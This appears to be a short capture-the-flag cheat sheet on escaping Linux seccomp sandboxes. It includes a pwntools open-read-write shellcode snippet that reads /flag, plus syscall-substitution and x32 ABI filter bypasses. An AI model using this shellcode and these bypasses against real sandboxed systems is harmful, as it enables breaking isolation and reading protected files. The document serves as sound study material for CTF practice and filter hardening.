# Seccomp Sandbox Escapes (skills/pwn/sandbox-escape.md)

## 1. Inspecting Seccomp Rules
Run `seccomp-tools`:
```bash
seccomp-tools dump ./vuln
```

---

## 2. Common Bypasses

### 2.1 Open-Read-Write (ORW) Shellcode
When `execve` is blocked but `open` (or `openat`), `read`, `write` are allowed:

```python
from pwn import *
context.arch = 'amd64'

# x86_64 ORW Shellcode
shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)

payload = asm(shellcode)
```

### 2.2 Using `openat` / `openat2` / `mmap`
If `open` (syscall 2) is blocked:
- Use `openat(AT_FDCWD, "/flag", O_RDONLY)` (syscall 257).
- If `read` is blocked, use `mmap` or `sendfile(1, fd, 0, 0x100)`.

### 2.3 Architecture Switching (x32 ABI)
If seccomp checks `arch == AUDIT_ARCH_X86_64`:
- Or in syscall numbers with `0x40000000` (e.g., `0x40000000 + 2` for `open` under x32 ABI) to bypass syscall number blacklist filters if the filter forgets to check the upper 32-bit flags.
